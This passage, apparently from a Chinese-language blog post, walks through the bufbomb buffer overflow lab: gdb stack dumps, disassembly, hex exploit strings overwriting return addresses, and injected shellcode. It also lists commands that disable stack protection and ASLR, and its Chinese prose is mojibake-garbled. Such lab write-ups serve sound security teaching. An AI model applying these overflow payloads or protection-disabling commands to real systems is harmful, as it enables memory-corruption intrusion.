class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    ğŸ˜€<span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x4c</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba58:â–¶  <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    â¤<span class=\"number\">0</span>x20    <span class=\"number\">0</span>x8e    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08â¤</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba60:     <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x9a    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x84    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br></pre></td></tr></table></figure>\n<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Smoke!: You called smoke()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-1-çƒŸç«\"><a class=\"markdownIt-Anchor\" href=\"#level-1-çƒŸç«\"></a> Level 1 - çƒŸç«</h2>\n<blockquote>\n<p>æœ¬å±‚è€ƒå¯Ÿå‡½æ•°ä¼ å‚ã€‚</p>\n</blockquote>\n<p>bufbomb å­˜åœ¨å¦ä¸€ä¸ªå‡½æ•° fizzï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fizz</span><span class=\"params\">(<span class=\"type\">int</span> val)</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">1</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\"><span class=\"keyword\">if</span> (val == cookie) &#123; </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fizz!: You called fizz(0x%x)\\n&quot;</span>, val);  <span class=\"comment\">// æˆ‘ä»¬å¿…é¡»è¿è¡Œåˆ°è¿™é‡Œ</span></span><br><span class=\"line\">\tvalidate(<span class=\"number\">1</span>); </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Misfire: You called fizz(0x%x)\\n&quot;</span>, val); </span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>ç›®æ ‡ï¼šâ€œè¿”å›â€åˆ°è¯¥å‡½æ•°å¹¶ä¼ é€å‚æ•° cookieã€‚Cookie ä¸ºä¸Šæ–‡æåˆ°çš„ <code>makecookie</code> ç¨‹åºç»“åˆè‡ªå·±å­¦å·ç”Ÿæˆ <code>./makecookie SA08225155</code>ã€‚</p>\n<p>fizz Â çš„åœ°å€ä¸º Â <code>0x08048dc0</code>ï¼Œå°ç«¯å†™æ³•ï¼š<code>c0 8d 04 08</code>ã€‚æ‰€ä»¥å‚ç…§ Level 0ï¼Œå¾—åˆ° exploit çš„åŸºæœ¬å†™æ³•ä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08</span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­é˜…è¯»åæ±‡ç¼–ä»£ç ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8048dc0 &lt;fizz&gt;:</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc0:\t<span class=\"number\">55</span>                   \tpush   %ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc1:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc3:\t<span class=\"number\">53</span>                   \tpush   %ebx</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc4:\t<span class=\"number\">83</span> ec <span class=\"number\">14</span>             \tsub    $<span class=\"number\">0</span>x14,%esp</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc7:\t<span class=\"number\">8</span>b <span class=\"number\">5</span>d <span class=\"number\">0</span>8             \tmov    <span class=\"number\">0</span>x8(%ebp),%ebx      #  ä¸è¦çœ‹é”™ä¸º-<span class=\"number\">0</span>x8(%ebp)</span><br><span class=\"line\"> # <span class=\"number\">0</span>x8(%ebp)  <span class=\"number\">0</span>x8049ac7 -&gt; </span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049ac7</span><br><span class=\"line\">; $<span class=\"number\">99</span> = <span class=\"number\">0</span>x8049ac7 <span class=\"string\">&quot;Type string:&quot;</span></span><br><span class=\"line\"> <span class=\"number\">8048</span>dca:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>1 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x1,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>dd1:\te8 ca fb ff ff       \tcall   <span class=\"number\">80489</span>a0 &lt;entry_check&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dd6:\t<span class=\"number\">3</span>b <span class=\"number\">1</span>d cc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8    \tcmp    <span class=\"number\">0</span>x804a1cc,%ebx      #  <span class=\"number\">0</span>x804a1cc å­˜å‚¨çš„æ˜¯cookieå­—ç¬¦ä¸² <span class=\"number\">0</span>x2ac98515 å¯¹åº”æˆ‘çš„å­¦å·</span><br><span class=\"line\"> <span class=\"number\">8048</span>ddc:\t<span class=\"number\">74</span> <span class=\"number\">22</span>                \tje     <span class=\"number\">8048e0</span>0 &lt;fizz+<span class=\"number\">0</span>x40&gt;  # è¦æƒ³æˆåŠŸï¼Œå¿…é¡»ç›¸ç­‰</span><br><span class=\"line\"> <span class=\"number\">8048</span>dde:\t<span class=\"number\">89</span> <span class=\"number\">5</span>c <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %ebx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>de2:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">98</span> <span class=\"number\">98</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049898,(%esp)    # ä¼ å…¥å­—ç¬¦ä¸²ï¼š<span class=\"string\">&quot;Misfire: You called fizz(0x%x)\\n&quot;</span></span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049898</span><br><span class=\"line\">; $<span class=\"number\">53</span> = <span class=\"number\">0</span>x8049898 <span class=\"string\">&quot;Misfire: You called fizz(0x%x)\\n&quot;</span>  </span><br><span class=\"line\"> <span class=\"number\">8048</span>de9:\te8 <span class=\"number\">76</span> f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"number\">8048</span>dee:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x0,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>df5:\te8 aa f9 ff ff       \tcall   <span class=\"number\">80487</span>a4 &lt;exit<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dfa:\t<span class=\"number\">8</span>d b6 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0    \tlea    <span class=\"number\">0</span>x0(%esi),%esi</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"number\">8048e0</span>0:\t<span class=\"number\">89</span> <span class=\"number\">5</span>c <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %ebx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048e0</span>4:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">29</span> <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a29,(%esp) # ä¼ å…¥å­—ç¬¦ä¸²<span class=\"string\">&quot; Fizz!: You called fizz(0x%x)\\n&quot;</span></span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049a29</span><br><span class=\"line\">; $<span class=\"number\">54</span> = <span class=\"number\">0</span>x8049a29 <span class=\"string\">&quot;Fizz!: You called fizz(0x%x)\\n&quot;</span> &lt;- è¿™ä¸ªæ‰æ˜¯æˆåŠŸçš„</span><br><span class=\"line\"> <span class=\"number\">8048e0</span>b:\te8 <span class=\"number\">54</span> f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048e10</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>1 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x1,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048e17</span>:\te8 c4 fc ff ff       \tcall   <span class=\"number\">8048</span>ae0 &lt;validate&gt;</span><br><span class=\"line\"> <span class=\"number\">8048e1</span>c:\teb d0                \tjmp    <span class=\"number\">8048</span>dee &lt;fizz+<span class=\"number\">0</span>x2e&gt;</span><br><span class=\"line\"> <span class=\"number\">8048e1</span>e:\t<span class=\"number\">89</span> f6                \tmov    %esi,%esi</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬çŸ¥é“ï¼Œè¦æƒ³æˆåŠŸï¼Œå¿…é¡»åœ¨è·³è½¬åˆ° <code>fizz</code> å‡½æ•°åï¼Œä¼ å…¥å‚æ•°ï¼ˆå‚æ•°å€¼ä¸ºè‡ªå·±çš„ cookieï¼‰ã€‚è¿™ä¸ªå‚æ•°ä¿å­˜åœ¨ <code>0x8(%ebp)</code> ä¸­ã€‚è€æ–¹æ³•ï¼Œç›´æ¥è¦†ç›–å³å¯ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08 ee ee ee ee 15 85 c9 2a</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(gdb) p /x $esp</span><br><span class=\"line\">$<span class=\"number\">1</span> = <span class=\"number\">0</span>xffffba44</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) p /x $ebp</span><br><span class=\"line\">$<span class=\"number\">2</span> = <span class=\"number\">0</span>xffffba5c</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) x/<span class=\"number\">60</span>xb $esp</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba44:â©  <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7    <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba4c:     <span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44    <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba54:     <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba5c:â–¶   <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xee    <span class=\"number\">0</span>xee    <span class=\"number\">0</span>xee    <span class=\"number\">0</span>xee</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba64:     â¤<span class=\"number\">0</span>x15    <span class=\"number\">0</span>x85    <span class=\"number\">0</span>xc9    <span class=\"number\">0</span>x2aâ¤    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba6c:     <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7    <span class=\"number\">0</span>x86    <span class=\"number\">0</span>x91    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba74:     <span class=\"number\">0</span>xef    <span class=\"number\">0</span>xbe    <span class=\"number\">0</span>xad    <span class=\"number\">0</span>xde    <span class=\"number\">0</span>x98    <span class=\"number\">0</span>xcc    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba7c:     <span class=\"number\">0</span>x05    <span class=\"number\">0</span>x91    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br></pre></td></tr></table></figure>\n<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Fizz!: You called fizz(0x2ac98515)</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-2-é­ç‚®é€‰åš\"><a class=\"markdownIt-Anchor\" href=\"#level-2-é­ç‚®é€‰åš\"></a> Level 2 - é­ç‚®ã€é€‰åšã€‘</h2>\n<blockquote>\n<p>æœ¬å±‚è€ƒå¯ŸæŒ‡ä»¤æ³¨å…¥ã€‚</p>\n</blockquote>\n<p>è¿™ä¸€å±‚æˆ‘ä»¬éœ€è¦è·³è½¬åˆ°å¦ä¸€ä¸ªå‡½æ•°ï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> global_value = <span class=\"number\">0</span>; </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bang</span><span class=\"params\">(<span class=\"type\">int</span> val)</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">2</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (global_value == cookie) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Bang!: You set global_value to 0x%x\\n&quot;</span>, global_value); <span class=\"comment\">// å¿…é¡»æ‰§è¡Œåˆ°è¿™é‡Œ</span></span><br><span class=\"line\">\t\tvalidate(<span class=\"number\">2</span>); </span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Misfire: global_value = 0x%x\\n&quot;</span>, global_value); </span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¸ä¸Šä¸€å±‚çš„ä¸åŒç‚¹åœ¨äºè¿™ä¸ªå‡½æ•°æ£€æŸ¥çš„æ˜¯å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡å­˜å‚¨åœ¨ä¸€ä¸ªç‰¹å®šçš„åœ°å€ä¸­ã€‚</p>\n<p>è§‚å¯Ÿåæ±‡ç¼–åçš„ä»£ç ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8048d60 &lt;bang&gt;:</span><br><span class=\"line\"> <span class=\"number\">8048</span>d60:\t<span class=\"number\">55</span>                   \tpush   %ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>d61:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>d63:\t<span class=\"number\">83</span> ec <span class=\"number\">0</span>8             \tsub    $<span class=\"number\">0</span>x8,%esp</span><br><span class=\"line\"> <span class=\"number\">8048</span>d66:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>2 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x2,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d6d:\te8 <span class=\"number\">2</span>e fc ff ff       \tcall   <span class=\"number\">80489</span>a0 &lt;entry_check&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d72:\ta1 dc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8       \tmov    <span class=\"number\">0</span>x804a1dc,%eax   # å…¨å±€å˜é‡å­˜æ”¾åœ°å€ï¼ˆæˆ‘ä»¬éœ€è¦ä¿®æ”¹ï¼‰</span><br><span class=\"line\">;  (gdb) p /x *<span class=\"number\">0</span>x804a1dc</span><br><span class=\"line\">; $<span class=\"number\">5</span> = <span class=\"number\">0</span>x0</span><br><span class=\"line\"> <span class=\"number\">8048</span>d77:\t<span class=\"number\">3</span>b <span class=\"number\">0</span>5 cc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8    \tcmp    <span class=\"number\">0</span>x804a1cc,%eax   # cookieå­˜æ”¾åœ°å€</span><br><span class=\"line\">;  (gdb) p /x *<span class=\"number\">0</span>x804a1cc</span><br><span class=\"line\">; $<span class=\"number\">6</span> = <span class=\"number\">0</span>x2ac98515 </span><br><span class=\"line\"> <span class=\"number\">8048</span>d7d:\t<span class=\"number\">74</span> <span class=\"number\">21</span>                \tje     <span class=\"number\">8048</span>da0 &lt;bang+<span class=\"number\">0</span>x40&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d7f:\t<span class=\"number\">89</span> <span class=\"number\">44</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %eax,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d83:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>b <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a0b,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d8a:\te8 d5 f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d8f:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x0,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>d96:\te8 <span class=\"number\">0</span>9 fa ff ff       \tcall   <span class=\"number\">80487</span>a4 &lt;exit<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>d9b:\t<span class=\"number\">90</span>                   \tnop</span><br><span class=\"line\"> <span class=\"number\">8048</span>d9c:\t<span class=\"number\">8</span>d <span class=\"number\">74</span> <span class=\"number\">26</span> <span class=\"number\">0</span>0          \tlea    <span class=\"number\">0</span>x0(%esi,%eiz,<span class=\"number\">1</span>),%esi</span><br><span class=\"line\"> <span class=\"number\">8048</span>da0:\t<span class=\"number\">89</span> <span class=\"number\">44</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %eax,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>da4:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">70</span> <span class=\"number\">98</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049870,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>dab:\te8 b4 f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>db0:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>2 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x2,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>db7:\te8 <span class=\"number\">24</span> fd ff ff       \tcall   <span class=\"number\">8048</span>ae0 &lt;validate&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dbc:\teb d1                \tjmp    <span class=\"number\">8048</span>d8f &lt;bang+<span class=\"number\">0</span>x2f&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dbe:\t<span class=\"number\">89</span> f6                \tmov    %esi,%esi</span><br></pre></td></tr></table></figure>\n<p>ç¨‹åºå–å…¨å±€å˜é‡çš„åœ°å€ä¸º <code>0x804a1dc</code>ï¼Œè¿™ä¸ªåœ°å€åˆå§‹å€¼ä¸º 0ã€‚ç¨‹åºè®¡ç®—å¥½çš„ cookie æ”¾åœ¨ <code>0x804a1cc</code>ï¼Œä¼šå’Œå…¨å±€å˜é‡è¿›è¡Œæ¯”è¾ƒã€‚æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯å®ç°ä¿®æ”¹å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬è¿™æ—¶å€™å°±éœ€è¦æ„é€ æŒ‡ä»¤ï¼Œæ³¨å…¥ä»£ç äº†ã€‚</p>\n<p>æ„é€ æŒ‡ä»¤çš„æ­¥éª¤ï¼š</p>\n<ol>\n<li>å†™ä¸€å°æ®µæ±‡ç¼–ç¨‹åº <code>level2.s</code></li>\n<li>ç¼–è¯‘ï¼š<code>gcc -c level2.s </code></li>\n<li>åæ±‡ç¼–å¾—åˆ°å­—èŠ‚ç ï¼š<code>objdump -d level2.o &gt; level2.d</code></li>\n</ol>\n<p>è¿™æ®µä»£ç å¦‚ä½•æ‰§è¡Œï¼Ÿå‰é¢ä¸¤ä¸ªå®éªŒå·²ç»å®ç°äº†è·³è½¬åˆ°æŸä¸ªå‡½æ•°åœ°å€æ‰§è¡Œä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å…¶è·³è½¬åˆ°ç¼“å†²åŒºä¸­ï¼Œæ‰§è¡Œæˆ‘ä»¬æ³¨å…¥çš„æŒ‡ä»¤ã€‚</p>\n<p>ä½†æ˜¯åœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œæ ˆä¸­çš„å†…å®¹ä¸å¯æ‰§è¡Œï¼ˆè¯¾æœ¬å¥½åƒè®²è¿‡ç›¸å…³å†…å®¹ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å·¥å…· <code>execstack</code> æ¥è§¦æ ˆæ‰§è¡Œçš„é™åˆ¶ï¼š</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> apt-get install execstack <span class=\"comment\"># å®‰è£… execstack</span></span><br><span class=\"line\">execstack -s bufbomb                  <span class=\"comment\"># äº²æµ‹ï¼ŒGDBåšåˆ°è¿™ä¸€æ­¥å°±è¡Œ</span></span><br><span class=\"line\">sysctl -w kernel.randomize_va_space=0 <span class=\"comment\"># å…³é—­ASLRï¼ˆåœ°å€ç©ºé—´éšæœºåŒ–ï¼‰å‘½ä»¤</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>å¦‚æœä¸è§£é™¤é™åˆ¶ï¼Œåç»­å®éªŒå¯èƒ½ä¼šæŠ¥æ®µé”™è¯¯ã€‚</p>\n</blockquote>\n<p>ä¸‹é¢ç¼–å†™ <code>level2.s</code>ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl $<span class=\"number\">0</span>x2ac98515,<span class=\"number\">0</span>x804a1dc</span><br><span class=\"line\">movl $<span class=\"number\">0</span>x08048d60,(%rsp)</span><br><span class=\"line\">ret</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>æ³¨æ„æ±‡ç¼–ä»£ç æ–‡ä»¶æœ«å°¾æœ‰ç©ºè¡Œï¼Œå¦åˆ™æœ‰è­¦å‘Šï¼šwarning: end of file not at end of a line; newline inserted</p>\n</blockquote>\n<p>ä¸Šé¢çš„æ±‡ç¼–ä»£ç åšäº†å‡ ä»¶äº‹æƒ…ï¼š</p>\n<ol>\n<li>æŠŠ cookie æ”¾å…¥å…¨å±€å˜é‡ï¼ˆ<code>0x804a1dc</code>ï¼‰ä¸­</li>\n<li>æŠŠ bang çš„å‡½æ•°åœ°å€å‹æ ˆ</li>\n<li>è¿”å›ã€‚ï¼ˆå¼¹æ 